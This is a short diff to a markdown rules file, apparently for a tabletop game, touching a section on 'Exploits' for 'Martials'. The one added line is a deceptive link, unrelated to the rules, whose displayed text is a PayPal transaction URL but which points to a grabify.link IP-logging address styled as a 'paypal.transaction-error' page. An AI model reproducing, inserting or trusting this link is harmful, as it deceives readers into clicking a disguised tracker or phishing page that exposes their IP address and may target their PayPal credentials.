@@ -7,3 +7,5 @@
 ### Exploits
 
 All Martials have access to Exploits, which are categorized based on their 
+
+[https://www.paypal.com/myaccount/activities/details/35B39680HG456381R](https://grabify.link/paypal.transaction-error.php?ref=8HLXX8)
